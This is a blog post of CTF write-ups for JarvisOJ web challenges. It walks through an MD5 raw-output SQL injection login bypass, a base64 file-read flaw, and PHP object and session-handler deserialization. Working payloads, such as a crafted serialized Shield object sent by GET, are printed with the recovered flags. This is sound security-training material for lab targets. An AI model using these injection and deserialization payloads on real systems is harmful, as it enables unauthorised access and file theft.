<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="â€œä¸€ä¸ªä¸åƒäºŒè¿›åˆ¶åŒå­¦çš„åšå®¢ã€‚â€"><title>CTf-JarvisOJ-250-300 | f01965</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = 'https://hm.baidu.com/hm.js?' + 'true';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
  </script></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CTf-JarvisOJ-250-300</h1><a id="logo" href="/.">f01965</a><p class="description">åˆé—»ä¸çŸ¥æ›²ä¸­æ„ï¼Œå†å¬å·²æ˜¯æ›²ä¸­äººã€‚</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> é¦–é¡µ</i></a><a href="/archives/"><i class="fa fa-archive"> å½’æ¡£</i></a><a href="/about/"><i class="fa fa-user"> å…³äº</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CTf-JarvisOJ-250-300</h1><div class="post-meta">Mar 10, 2020<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> é˜…è¯»</span></span></div><a class="disqus-comment-count" href="/2020/03/10/CTf-JarvisOJ-250-300/#vcomment"><span class="valine-comment-count" data-xid="/2020/03/10/CTf-JarvisOJ-250-300/"></span><span> æ¡è¯„è®º</span></a><div class="post-content"><h3 id="WriteUp-ä¸­æ‰€æœ‰å†…å®¹å’ŒçŸ¥è¯†ç‚¹å‡æ¥æºäºå‚è€ƒèµ„æ–™çš„å¸ˆå‚…ä»¬ã€‚"><a href="#WriteUp-ä¸­æ‰€æœ‰å†…å®¹å’ŒçŸ¥è¯†ç‚¹å‡æ¥æºäºå‚è€ƒèµ„æ–™çš„å¸ˆå‚…ä»¬ã€‚" class="headerlink" title="WriteUp ä¸­æ‰€æœ‰å†…å®¹å’ŒçŸ¥è¯†ç‚¹å‡æ¥æºäºå‚è€ƒèµ„æ–™çš„å¸ˆå‚…ä»¬ã€‚"></a>WriteUp ä¸­æ‰€æœ‰å†…å®¹å’ŒçŸ¥è¯†ç‚¹å‡æ¥æºäºå‚è€ƒèµ„æ–™çš„å¸ˆå‚…ä»¬ã€‚</h3><h2 id="Login-250"><a href="#Login-250" class="headerlink" title="Login  250"></a>Login  250</h2><p>é¢˜ç›®æ˜¯ä¸€ä¸ªç™»é™†æ¡†ï¼Œè¾“å…¥å¯†ç ï¼Œè¾“é”™ä¼šæŠ¥é”™ã€‚<br>æŠ“åŒ…ï¼Œå‘ç°è¿”å›åŒ…æœ‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Perl/v5.16.3</span><br><span class="line">X-Powered-By: PHP/5.6.21</span><br><span class="line">Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure></p>
<p>è€ƒç‚¹ï¼šmd5 å’Œ sql è¯­å¥å¯ä»¥åˆ©ç”¨16è¿›åˆ¶çš„ç‰¹æ€§ï¼Œæ„é€ ç‰¹æ®Šçš„é¡¹æŸ¥æ‰¾æ³¨å…¥<br>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/greyfreedom/article/details/45846137?utm_source=blogxgwz7" target="_blank" rel="noopener">https://blog.csdn.net/greyfreedom/article/details/45846137?utm_source=blogxgwz7</a><br><a href="http://www.7ten7.top/2018/12/05/MD5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">MD5åŠ å¯†åçš„SQLæ³¨å…¥</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MD5åŠ å¯†åçš„SQLæ³¨å…¥ã€‚</span><br><span class="line">å…¶ä¸­æœ€ä¸»è¦çš„å°±æ˜¯md5()å‡½æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueæ—¶ï¼Œä¼šè¿”å›16å­—ç¬¦çš„äºŒè¿›åˆ¶æ ¼å¼ã€‚å½“ä¸ºfalseçš„æ—¶å€™ï¼Œè¿”å›çš„å°±æ˜¯32å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚é»˜è®¤çš„æ˜¯falseæ¨¡å¼ã€‚å…·ä½“çš„å·®åˆ«é€šè¿‡ä¸‹é¢è¿™ä¸ªä»£ç æ¥çœ‹ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1 md5(&quot;123456&quot;);			//e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">2 md5(&quot;123456&quot;,true);		//ï¿½ ï¿½9Iï¿½Yï¿½ï¿½Vï¿½Wï¿½ï¿½&gt;</span><br><span class="line"></span><br><span class="line">ffifdyop = &apos;or&apos;&lt;trash&gt;</span><br><span class="line"></span><br><span class="line">md5(str,true)ä¹‹åçš„å€¼æ˜¯åŒ…å«äº†&apos;or&apos;&lt;trash&gt;è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆsqlè¯­å¥å°±æ˜¯ password=&apos;&apos;or&apos;6&lt;trash&gt;&apos;</span><br><span class="line"></span><br><span class="line">PCTF&#123;R4w_md5_is_d4ng3rous&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="ç¥ç›¾å±€çš„ç§˜å¯†-300"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†-300" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯† 300"></a>ç¥ç›¾å±€çš„ç§˜å¯† 300</h2><p>é¢˜ç›®æ˜¯ä¸ªå›¾ç‰‡ã€‚è®¿é—®ä¸€ä¸‹ã€‚æŠ“åŒ…ï¼Œçœ‹åˆ°è¿”å›çš„åŒ…æœ‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</span><br><span class="line">c2hpZWxkLmpwZw== è§£å¯†å‡ºæ¥æ˜¯ shield.jpg</span><br></pre></td></tr></table></figure></p>
<p>æŠ“åŒ…è®¿é—®ä¸€ä¸‹ï¼Œè¿”å›åŒ…é‡Œé¢æœ‰ä¸€å¤§å † JEIF å¼€å¤´çš„æ•°æ®ä¹±ç æ•°æ®ã€‚<br>è¿™åº”è¯¥æ˜¯æ‰“å°å‡ºçš„ shield.jpg   é‡Œçš„æ•°æ®ã€‚è¿™é‡Œå°±æ˜¯ä¸€ä¸ªphpæ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ„æ€æ˜¯æŠŠå…¶ä»–æ–‡ä»¶ç”¨base64åŠ å¯†ï¼Œä¹Ÿèƒ½ç„¶åå½“æˆimgçš„å‚æ•°ï¼Œä¹Ÿèƒ½æ‰“å°å‡ºåˆ«çš„æ–‡ä»¶çš„å†…å®¹ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œå°è¯•æŠŠ showimg.php åŠ å¯† c2hvd2ltZy5waHA=</span><br><span class="line">å‘åŒ…</span><br><span class="line">GET /showimg.php?img=c2hvd2ltZy5waHA= HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">å¾—åˆ°è¿”å›</span><br><span class="line">&lt;?php</span><br><span class="line">	$f = $_GET[&apos;img&apos;];</span><br><span class="line">	if (!empty($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		if (stripos($f,&apos;..&apos;)===FALSE &amp;&amp; stripos($f,&apos;/&apos;)===FALSE &amp;&amp; stripos($f,&apos;\\&apos;)===FALSE</span><br><span class="line">		&amp;&amp; stripos($f,&apos;pctf&apos;)===FALSE) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo &quot;File not found!&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">è¿™é‡Œåˆ¤æ–­äº† pctf æ˜¯å¦å‡ºç°åœ¨imgçš„å‚æ•°ä¸­ï¼Œä¹Ÿå°±æ˜¯æŠŠpctfå…³é”®å­—è¿‡æ»¤äº†ã€‚</span><br><span class="line">stripos å®šä¹‰å’Œç”¨æ³•</span><br><span class="line">stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œçœ‹åˆ°ï¼Œæœ‰ä¸ª pctfï¼Œå°è¯•åŠ å¯†åï¼Œè®¿é—®ä¸€ä¸‹è¯•è¯•ã€‚ç»“æœfile not foundã€‚é‚£ä¹ˆç»§ç»­çœ‹çœ‹Index.phpçš„å†…å®¹ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	require_once(&apos;shield.php&apos;);</span><br><span class="line">	$x = new Shield();</span><br><span class="line">	isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];</span><br><span class="line">	if (!empty($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	echo $x-&gt;readfile();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</span><br><span class="line"></span><br><span class="line">unserialize() å‡½æ•°</span><br><span class="line">ç”¨äºå°†é€šè¿‡ serialize() å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„ã€‚</span><br></pre></td></tr></table></figure></p>
<p>åœ¨è¿™ä¸ªindex.phpå¯ä»¥å¾—åˆ°ï¼š<br>é€šè¿‡ GET å¾—åˆ°ä¸€ä¸ª class å‚æ•°ç»™ gï¼Œç„¶åæŠŠ g unserialize ååºåˆ—åŒ–ã€‚<br>ç„¶åé€šè¿‡ xå˜é‡å»è¯»å–æ–‡ä»¶ã€‚x æ˜¯ä¸€ä¸ªShield() ç±»ã€‚<br>ç»§ç»­è¯•è¯•è¯»å– shield.php è¯•è¯•çœ‹ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">shield.php åŠ å¯† c2hpZWxkLnBocA==</span><br><span class="line">å¾—åˆ°</span><br><span class="line">&lt;?php</span><br><span class="line">	//flag is in pctf.php</span><br><span class="line">	class Shield &#123;</span><br><span class="line">		public $file;</span><br><span class="line">		function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">			$this -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		function readfile() &#123;</span><br><span class="line">			if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  </span><br><span class="line">			&amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123;</span><br><span class="line">				return @file_get_contents($this-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">è¿™é‡Œå®šä¹‰äº†Shieldç±»ï¼Œå¹¶è¯´flagå°±åœ¨pctf.phpä¸­ï¼Œå‰é¢è¯´åˆ°æŠŠ pctfå…³é”®å­—è¿‡æ»¤äº†ã€‚</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆæ€ä¹ˆåŠï¼Ÿ<br>å‰é¢çœ‹åˆ° <strong>Index.php</strong> ä¸­ï¼Œå¯ä»¥é€šè¿‡ <strong>x</strong> å˜é‡å»è¯»æ–‡ä»¶ã€‚å‰ææ˜¯ <strong>g</strong> æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„å‚æ•°ã€‚<br><strong>g</strong> é€šè¿‡ <strong>GET class</strong> å¾—åˆ°ã€‚æ³¨æ„ <strong>x</strong> æ˜¯ä¸€ä¸ª <strong>Shield</strong> ç±»ï¼Œä¸Šé¢å¯ä»¥çœ‹åˆ° <strong>Shield</strong> ç±»ä¸­æœ‰ä¸ª <strong>$file</strong> å‚æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€  $file =â€pctf.phpâ€ã€‚</p>
<p>ä½†ï¼Œå‰ææ˜¯ <strong>pctf.php</strong> æ˜¯åšä¸º <strong>Shield</strong> ç±»çš„å‚æ•°ï¼ŒåŒ…å«åœ¨ <strong>x</strong> å˜é‡ä¸­ã€‚<strong>x</strong> å˜é‡åç»­è¦è¢«ååºåˆ—åŒ–è¯»å‡ºæ¥ã€‚é‚£å¿…é¡»å…ˆæŠŠ <strong>Shield</strong> ç±»å¸¦ä¸Šå‚æ•° <strong>pctf.php</strong>ï¼Œç„¶åè¿›è¡Œåºåˆ—åŒ–ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php åºåˆ—åŒ–å‡½æ•° serialize() å‡½æ•°ï¼š   </span><br><span class="line">serialize() å‡½æ•°ç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</span><br><span class="line">serialize() å‡½æ•°åºåˆ—åŒ–å¯¹è±¡åï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å®ƒä¼ é€’ç»™å…¶ä»–éœ€è¦å®ƒçš„åœ°æ–¹ï¼Œä¸”å…¶ç±»å‹å’Œç»“æ„ä¸ä¼šæ”¹å˜</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆéœ€è¦å°† Shield ç±»å¸¦ä¸Š pctfå‚æ•°åï¼Œåºåˆ—åŒ–å¤„ç†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//flag is in pctf.php</span><br><span class="line">	class Shield &#123;</span><br><span class="line">		public $file;</span><br><span class="line">		function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">			$this -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		function readfile() &#123;</span><br><span class="line">			if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  </span><br><span class="line">			&amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123;</span><br><span class="line">				return @file_get_contents($this-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$x = new Shield(&quot;pctf.php&quot;);</span><br><span class="line">	$serialized_data = serialize($x);</span><br><span class="line">    echo  $serialized_data;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>å°†ä¸Šé¢çš„è„šæœ¬æ”¾åˆ°kaliä¸‹ï¼Œå®‰è£…Phpç¯å¢ƒï¼Œæ‰§è¡Œä¸€ä¸‹ï¼Œè¾“å‡ºçš„å°±æ˜¯åºåˆ—åŒ–çš„ç»“æœäº†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br><span class="line">è®¿é—®ï¼š index.php?class = xxxxx</span><br><span class="line">å‘åŒ…</span><br><span class="line">GET /index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">å¾—åˆ°</span><br><span class="line">&lt;?php </span><br><span class="line">	//Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span><br><span class="line">	//Fake flag:</span><br><span class="line">	echo &quot;FLAG: PCTF&#123;I_4m_not_fl4g&#125;&quot;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<p>å‚è€ƒï¼š<br><a href="https://www.jianshu.com/p/d5b6fc7d7966" target="_blank" rel="noopener">https://www.jianshu.com/p/d5b6fc7d7966</a><br><a href="https://www.runoob.com/php/php-serialize-function.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-serialize-function.html</a> </p>
<h2 id="RE-300"><a href="#RE-300" class="headerlink" title="RE? 300"></a>RE? 300</h2><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªsoæ–‡ä»¶ï¼ŒupxåŠ å¯†è¿‡ã€‚è§£å¯†å‡ºé”™ã€‚æŸ¥èµ„æ–™ï¼Œå¯ä»¥å¾— udf.so æ–‡ä»¶å¯ä»¥åŠ åˆ° mysql æ•°æ®åº“ã€‚<br>å‚è€ƒï¼š<a href="https://blog.csdn.net/lidan3959/article/details/17264405" target="_blank" rel="noopener">https://blog.csdn.net/lidan3959/article/details/17264405</a><br>è¿™ä¸ªé¢˜ä¸»è¦æ˜¯å…ˆæ‰“ä¸ªç¯å¢ƒï¼Œå¸¦mysqlçš„linuxç¯å¢ƒã€‚åœ¨kaliä¸‹ä½¿ç”¨dockeræ¥ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">etc/apt/sources.list æ·»åŠ æº</span><br><span class="line">deb https://apt.dockerproject.org/repo debian-stretch main</span><br><span class="line"></span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure></p>
<p>PCTF{Interesting_U5er_d3fined_Function}<br>ç¯å¢ƒå¤ªéš¾æ­äº†ã€‚æ”¾å¼ƒã€‚<br><a href="https://www.cnblogs.com/sijidou/p/10522972.html" target="_blank" rel="noopener">https://www.cnblogs.com/sijidou/p/10522972.html</a></p>
<h2 id="PHPINFO-300"><a href="#PHPINFO-300" class="headerlink" title="PHPINFO 300"></a>PHPINFO 300</h2><p>è®¿é—®é¢˜ç›®æä¾›äº†å¦‚ä¸‹çš„ä»£ç ã€‚phpåºåˆ—åŒ–çš„é—®é¢˜ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>çœ‹æ ·å­ï¼Œåº”è¯¥æ˜¯åˆ©ç”¨ OowoO ç±»ç»™ mdzz ä¼ é€’å‚æ•°ï¼Œé€šè¿‡ <strong>eval($this-&gt;mdzz)</strong> è¿›è¡Œæ•°æ®è¯»å–ã€‚é‚£ä¹ˆå¯èƒ½å°±è¦æŠŠ OowoO è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚  </p>
<p>æŸ¥èµ„æ–™å¾—ï¼š<br>è¿™é¢˜çš„è€ƒç‚¹æ˜¯ php å­˜å– $_SESSION æ•°æ®æ—¶ä¼šå¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œphp å†…ç½®äº†å¤šç§å¤„ç†å™¨ç”¨äºå­˜å– SESSION ã€‚<br>å¸¸ç”¨çš„æœ‰ä»¥ä¸‹ä¸‰ç§<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¤„ç†å™¨	             å¯¹åº”çš„å­˜å‚¨æ ¼å¼</span><br><span class="line">php	               é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</span><br><span class="line">php_binary	       é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</span><br><span class="line">php_serialize</span><br><span class="line">(php&gt;=5.5.4)	   ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„</span><br></pre></td></tr></table></figure></p>
<h5 id="é…ç½®é€‰é¡¹-session-serialize-handler"><a href="#é…ç½®é€‰é¡¹-session-serialize-handler" class="headerlink" title="é…ç½®é€‰é¡¹ session.serialize_handler"></a>é…ç½®é€‰é¡¹ session.serialize_handler</h5><p>PHP æä¾›äº† session.serialize_handler é…ç½®é€‰é¡¹ï¼Œé€šè¿‡è¯¥é€‰é¡¹å¯ä»¥è®¾ç½®åºåˆ—åŒ–åŠååºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler	&quot;php&quot;	PHP_INI_ALL</span><br></pre></td></tr></table></figure></p>
<h5 id="å®‰å…¨éšæ‚£"><a href="#å®‰å…¨éšæ‚£" class="headerlink" title="å®‰å…¨éšæ‚£"></a>å®‰å…¨éšæ‚£</h5><p>é€šè¿‡ä¸Šé¢å¯¹å­˜å‚¨æ ¼å¼çš„åˆ†æï¼Œå¦‚æœ PHP åœ¨ååºåˆ—åŒ–å­˜å‚¨çš„ $_SESSION æ•°æ®æ—¶çš„ä½¿ç”¨çš„å¤„ç†å™¨å’Œåºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼Œé€šè¿‡ç‰¹æ®Šçš„æ„é€ ï¼Œç”šè‡³å¯ä»¥ä¼ªé€ ä»»æ„æ•°æ®ï¼šï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;ryat&apos;] = &apos;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&apos;;</span><br></pre></td></tr></table></figure></p>
<p>ä¾‹å¦‚ä¸Šé¢çš„ SESSION æ•°æ®ï¼Œåœ¨å­˜å‚¨æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸º php_serializeï¼Œå­˜å‚¨çš„æ ¼å¼å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>åœ¨è¯»å–æ•°æ®æ—¶å¦‚æœç”¨çš„ååºåˆ—åŒ–å¤„ç†å™¨ä¸æ˜¯ php_serializeï¼Œè€Œæ˜¯ php çš„è¯ï¼Œé‚£ä¹ˆååºåˆ—åŒ–åçš„æ•°æ®å°†ä¼šå˜æˆï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// var_dump($_SESSION);</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;&quot;]=&gt;</span><br><span class="line">  object(stdClass)#1 (0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
